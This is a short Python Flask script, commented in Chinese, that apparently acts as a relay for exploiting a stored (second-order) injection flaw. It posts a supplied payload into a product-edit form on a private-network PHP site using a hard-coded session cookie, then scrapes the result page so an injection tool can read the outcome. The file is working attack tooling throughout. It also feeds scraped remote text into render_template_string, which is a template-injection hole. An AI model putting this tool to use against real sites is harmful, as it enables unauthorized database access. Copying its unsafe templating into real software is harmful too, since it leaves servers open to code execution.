#!/usr/bin/env python                                                                                                                 
# coding=utf-8
from flask import Flask, render_template_string, request
import requests
import re

app = Flask(__name__)

@app.route('/')
def index():
    u = requests.session()
    payload = request.args.get('id')
    target_url = ''
    response_url = ''

    # 发送的表单和headers
    ua = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
    cookie = "PHPSESSID=ddqpnve2g6ptetfu39b5kdoj24"
    data = {
        'name': payload, 
        'category': '1',
        'price': '123',
        'qty': '123',
        'image': '(binary)'
    }

    headers = {
    "User-Agent" : ua, 
    "Cookie" : cookie
    }
    
    # target_url是请求的url
    # response是回显url
    # (如果target_url请求之后本身会发生改变就直接注释掉response就好)
    
    target_url = 'http://192.168.1.106/supplier/edit_product.php?id=16'
    response_url = 'http://192.168.1.106/supplier/'
    
    
    if response_url != '':
        u.post(target_url, data = data, headers = headers)
        r = u.get(response_url, headers = headers)
        r.encoding = r.apparent_encoding
        ##### diy your res
        # res = r.text
        res = str(re.findall('<td>([^<]+)</td>', r.text)[-3])
        #####

        return render_template_string(res)

    else:
        r = u.post(target_url, data = data, headers = headers)
        r.encoding = r.apparent_encoding
        ##### diy your res
        res = str(re.findall('<td>([^<]+)</td>', r.text)[-3])
        #####
        return render_template_string(res)

if __name__ == "__main__":
    app.run(host='0.0.0.0')
